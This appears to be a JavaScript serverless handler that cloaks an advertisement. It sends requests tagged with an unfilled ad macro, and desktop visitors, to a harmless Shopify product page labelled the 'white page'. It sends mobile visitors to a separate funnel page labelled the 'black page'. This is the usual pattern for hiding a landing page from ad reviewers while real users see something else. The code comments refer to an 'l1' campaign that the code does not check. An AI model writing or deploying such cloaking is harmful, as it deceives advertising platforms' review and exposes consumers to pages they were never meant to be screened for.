export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://pineappledesignstore.myshopify.com/products/faux-snake-plant?pr_prod_strat=e5_desc&pr_rec_id=8a15aa43d&pr_rec_pid=6057687187606&pr_ref_pid=6147077472406&pr_seq=uniform";
    const blackPageURL = "https://sueiqpsajzxkaskq.myfunnelish.com/tt-ss-hh-pp";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
